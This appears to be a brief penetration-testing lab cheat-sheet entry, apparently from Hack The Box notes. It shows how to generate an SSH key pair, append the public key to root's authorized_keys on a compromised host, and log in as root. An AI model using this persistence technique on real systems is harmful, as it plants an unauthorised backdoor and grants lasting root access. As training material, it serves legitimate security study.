# SSH KEYS
```shell-session
gyrsec@htb[/htb]$ ssh-keygen -f key

user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

gyrsec@htb[/htb]$ ssh root@[ip] -i key
```